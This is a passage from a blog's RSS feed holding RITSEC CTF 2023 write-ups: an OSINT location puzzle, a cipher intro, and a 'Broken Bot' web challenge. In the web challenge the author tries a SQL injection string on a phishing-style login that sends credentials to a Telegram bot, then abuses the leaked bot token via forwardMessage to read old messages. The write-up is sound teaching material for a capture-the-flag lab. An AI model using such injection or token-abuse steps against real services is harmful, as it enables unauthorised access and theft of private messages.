+&lt;p&gt;I got &lt;em&gt;close&lt;/em&gt; to finding the flag here, but never got it across the line.  I will note where I got to and what I missed.  You can view the &lt;a href=&quot;https://gitlab.ritsec.cloud/competitions/ctf-2023-public/-/blob/master/MISC/Connection_Terminated/Connection_Terminated.md&quot;&gt;official writeup here&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;the-prompt&quot;&gt;The Prompt&lt;/h1&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[CONNECTION START]
+Unknown: &quot;DUDE YOU... [STATIC] BELIEVE WHERE AND WHAT WE ARE TRANSMITTING FROM!&quot;
+Walter: &quot;Your connection sounds fuzzy, theres no way you are using an antenna.&quot;
+Unknown: &quot;WE MADE OUR OWN USING TH... [STATIC]&quot;
+Walter: &quot;I'm losing you, what the hell are you talking about?&quot;
+Unkown: &quot;THERE IS NEWS REPORTING ABOUT IT, RIT LET US USE... [STATIC] THE ANTENNA.&quot;
+Walter: &quot;Dog what are you saying, you're on the news? Where are you?!&quot;
+Unknown: &quot;YEAH LOOK IT UP, OUR LOCATION IS... [STATIC].[STATIC].[STATIC]&quot;
+Walter: &quot;What kind of location uses three words?&quot;
+Unknown: &quot;I SEE MUNSON&quot;
+Walter: &quot;Wha...&quot;
+[CONNECTION TERMINATED]
+Walter: &quot;I need to try and find his location and flag him down, that made no sense.&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;three-part-location&quot;&gt;Three Part Location?&lt;/h2&gt;
+&lt;p&gt;That was a great question, what kind of location uses three words?  Let’s google it.  Oh, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;what3words&lt;/code&gt; is a thing?  Neat!  That must be it.  What else did the prompt tell us?&lt;/p&gt;
+
+&lt;h2 id=&quot;i-see-munson&quot;&gt;I SEE MUNSON&lt;/h2&gt;
+&lt;p&gt;I’m starting to this this may make more sense for RIT students, as &lt;a href=&quot;https://www.rit.edu/directory/dcmpro-david-munson&quot;&gt;David Munson&lt;/a&gt; is the current President of the Rochester Institute of Technology (RIT).  The location is probably going to be at the university (which makes sense for a CTF hosted by a university!) Let’s move on.&lt;/p&gt;
+
+&lt;h2 id=&quot;news&quot;&gt;NEWS&lt;/h2&gt;
+&lt;p&gt;Well, this is where I screwed up.  I searched for “RIT antenna news” and landed on an article about a &lt;a href=&quot;https://www.rit.edu/imagine/exhibits/transparent-antenna-system-provide-outdoor-wifi-museum-guests&quot;&gt;transparent antenna system to provide outdoor WiFi to museum guests&lt;/a&gt;.  ….this is objectively cool. Props, RIT. I recommend giving it a read.  I was sure I found the right thing, but I was wrong.  Looking into it more, I found the building it was in and used &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;what3words&lt;/code&gt; to get the address and submitted the flag, no dice.&lt;/p&gt;
+
+&lt;h2 id=&quot;im-stuck&quot;&gt;I’m Stuck&lt;/h2&gt;
+&lt;p&gt;I tried a few other locations for RIT, and none of them seemed to work.  RIT doesn’t appear to be a &lt;em&gt;small&lt;/em&gt; campus (I’ve never been, just looking at maps), so it would have been hard to try all possible locations.  This is where I gave up.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;I shouldn’t have given up when I did.  I have followed the clues correctly, but my search for the antenna overlooked the &lt;a href=&quot;https://hackaday.com/2023/03/23/enormous-metal-sculpture-becomes-an-antenna/&quot;&gt;Hackaday Artile&lt;/a&gt; that would have given me the correct location.  In the future, when I get stuck on a wrong answer, I should retrace my steps and double check my previous assumptions.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
+        <link>/blog/ritsec-ctf-2023/misc/connection-terminated</link>
+        <guid isPermaLink="true">/blog/ritsec-ctf-2023/misc/connection-terminated</guid>
+      </item>
+    
+      <item>
+        <title>RITSEC 2023 - Web / Broken Bot</title>
+        <description>&lt;h1 id=&quot;exploring-the-app&quot;&gt;Exploring the App&lt;/h1&gt;
+&lt;p&gt;Launching the site, you are brought to a login page where the username is already set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whiteteam at rit dot edu&lt;/code&gt;. My first thoughts were with regard to SQL Injection or default credentials.  I started with your standard sql injection attack by adding a password of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;' or 1=1-- -&lt;/code&gt;.  What happened next was quite interesting, and somewhat comical!  After a brief pause, you are redirected to another site with someone’s &lt;a href=&quot;https://archive.org/details/VoiceMail_173&quot;&gt;voicemail recording&lt;/a&gt;.  …Yep, nobody’s there right now.  Where this is a separate site, my assumption is that it’s not part of the challenge, and we missed something interesting on the login form.  Let’s go back to that.&lt;/p&gt;
+
+&lt;h1 id=&quot;how-did-we-get-there&quot;&gt;How Did We Get There?&lt;/h1&gt;
+&lt;p&gt;This time, I have my network tools open in my browser so I can watch the traffic.  I also start looking at the source code, and find a whole bunch of obfsucated JavaScript.  Having a background in JS, I start trying to un-obfsucate it…. and I finally get to the point where I realize I’m wasting my time a bit.  I don’t need to do all of that work yet, if I still don’t understand the &lt;em&gt;behavior&lt;/em&gt; of the site.  This is probably a rabbit hole that I don’t need to follow.&lt;/p&gt;
+
+&lt;p&gt;I monitor the network after I add a garbage password, and notice that there are a couple of requests that I wasn’t expecting &lt;em&gt;before&lt;/em&gt; I’m redirected to the voicemail page:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://ip.seeip.org/geoip&quot;&gt;https://ip.seeip.org/geoip&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://api.telegram.org/xxxx:xxxxx/sendMessage&quot;&gt;https://api.telegram.org/xxxx:xxxxx/sendMessage&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;the-telegram-call&quot;&gt;The Telegram Call&lt;/h1&gt;
+&lt;p&gt;The geoip call is made before the telegram request, and it does precisely what you think it would.  The telegram request is really interesting though.  Let’s inspect this a bit more.  This is a POST request, and it has a body of the following:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;chat_id: 5852841790
+text: ***Rit Cloud Storage by Zach A**
+
+Email: WhiteTeam@rit.edu
+Password : asdf
+IP Address : xxx.xxx.xxx.xxx
+Region : undefined
+City : undefined
+Country : United States
+Useragent : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
+Format : WhiteTeam@rit.edu
+Date Filled : 4/2/2023
+DateSent : 1/28/2023 2:55:30 p.m.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I’m no Telegram expert, but we are sending a plaintext password to telegram, and we presumably have everything we need to control that bot.  Now we need to learn what the bot can do, and get it to give us old messages so we can find the legitimate sign-in (which may or may not bring you somewhere else, or just be the flag).&lt;/p&gt;
+
+&lt;h1 id=&quot;telegrams-bot-api&quot;&gt;Telegram’s Bot API&lt;/h1&gt;
+&lt;p&gt;By design, the Telegram Bot API does not allow you to pull back arbitrary messages from a room, even if the bot is in that room.  I found this by googling around, and unfortunately didn’t note the sources where I read it.  However, bots are intended to be used as a means of interacting within a room.  Either way, let’s &lt;a href=&quot;https://core.telegram.org/bots/api&quot;&gt;read the docs&lt;/a&gt; to learn more about the capabilities.&lt;/p&gt;
+
+&lt;h2 id=&quot;sendmessage&quot;&gt;SendMessage&lt;/h2&gt;
+&lt;p&gt;First, we know we are using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendMessage&lt;/code&gt; API.  Presumably, we are sending that payload as a message to the room.  We also have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chatId&lt;/code&gt; and the bot’s super secret special URL. Note the following in the docs:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;On success, the sent Message is returned&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Great!  We know that we can get a Message object as a return object.&lt;/p&gt;
+
+&lt;h2 id=&quot;getme&quot;&gt;getMe&lt;/h2&gt;
+&lt;p&gt;There’s an endpoint that gets the current bot’s metadata.  Let’s see if there’s anything useful there:&lt;/p&gt;
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ok&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;result&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6055124896&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;is_bot&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;first_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;RIT_CTF_Telegram_Bot&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;xxxxx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;can_join_groups&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;can_read_all_group_messages&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;supports_inline_queries&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I was really excited about the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;can_read_all_group_messages&lt;/code&gt; permission, but as mentioned earlier, it’s not something we can use in a straightforward way.&lt;/p&gt;
+
+&lt;h2 id=&quot;getmydefaultadministratorrights&quot;&gt;getMyDefaultAdministratorRights&lt;/h2&gt;
+&lt;p&gt;This is another interesting looking endpoint, let’s see what it returns:&lt;/p&gt;
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ok&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;result&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;can_manage_chat&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;can_change_info&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;can_delete_messages&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;can_invite_users&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;can_restrict_members&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;can_pin_messages&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;can_manage_topics&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;can_promote_members&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;can_manage_video_chats&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;is_anonymous&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Ok, fine.  No smoking gun here, but at least we know what it has permission to do.&lt;/p&gt;
+
+&lt;h2 id=&quot;how-do-we-read-a-previous-message&quot;&gt;How do we read a previous Message?&lt;/h2&gt;
+&lt;p&gt;I’m quite sure at this point I need to exfil old messages from the specific chat.  I noted earlier that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendMessage&lt;/code&gt; api returns a Message object, let’s see if we can find any other endpoints that will do the same. I searched the api documentation for the exact phrase. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Message is returned&lt;/code&gt;.  There are a lot of results (24 or so), but the 2nd instance is for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forwardMessage&lt;/code&gt;.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/broken-bot/forwardMessage.png&quot; alt=&quot;Telegram's forwardMessage API Reference&quot; title=&quot;Telegram's forwardMessage API Reference&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+There’s no need to be quiet in this scenario, so we can probably forward the message back into the same channel without consequence.  Let’s start by just checking the first known message in this chat, and keep going until we find it.  Our request will look something like this:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://api.telegram.org/xxxx:xxxx/forwardMessage?chat_id=5852841790&amp;amp;from_chat_id=5852841790&amp;amp;message_id=1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Results:&lt;/p&gt;
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;ok&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;result&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;message_id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4882&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;from&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6055124896&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;is_bot&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;first_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;RIT_CTF_Telegram_Bot&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rochesterissodamncoldbot&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;chat&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5852841790&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;first_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Z&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;l337Hackzor&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;private&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;date&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1680532307&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;forward_from&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5852841790&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;is_bot&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;first_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Z&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;l337Hackzor&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+            &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;language_code&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;forward_date&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1679057324&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;text&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+        &lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;entities&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:[{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;offset&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;length&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bot_command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is awesome, we now have the first message ever sent.  Now all we need to do is keep incrementing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;message_id&lt;/code&gt; query param until we find one with valid credentials or a flag.  In this case, the flag was in message_id 8.&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;I &lt;em&gt;REALLY&lt;/em&gt; enjoyed this challenge! I actually liked that the JavaScript was a rabbit-hole, as it’s helping me focus my time on more meaningful enumeration.  While I eventually would have figured out what the JS was doing by de-obfuscating it, I was easily able to figure it out just by watching the &lt;em&gt;behavior&lt;/em&gt;.  Additionally, this is more of a real-world scenario where someone sets up a bot or automation, and doesn’t do enough to protect the credentials.  In this case, it appears that the bot’s URL is kind of like a webhook URL, in that you &lt;strong&gt;need to protect it the same way you do passwords&lt;/strong&gt;, otherwise bad actors could abuse it.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
+        <link>/blog/ritsec-ctf-2023/web/broken-bot</link>
+        <guid isPermaLink="true">/blog/ritsec-ctf-2023/web/broken-bot</guid>
+      </item>
+    
+      <item>
+        <title>RITSEC 2023 - Crypto / A Fine Cipher Writeup</title>
+        <description>&lt;h1 id=&quot;what-kind-of-cipher-is-this&quot;&gt;What kind of cipher is this?&lt;/h1&gt;
+&lt;p&gt;I didn’t recognize the format of the encrypted message that was provided, so I started with google.  I figured I could google the name of the challenge and that the Google Gods would steer me in the right direction….
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/a-fine-cipher/google-results.png&quot; alt=&quot;Google Search Results for &amp;quot;A Fine Cipher&amp;quot;&quot; title=&quot;Google Search Results&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Yep, google did its thing for me!&lt;/p&gt;
+
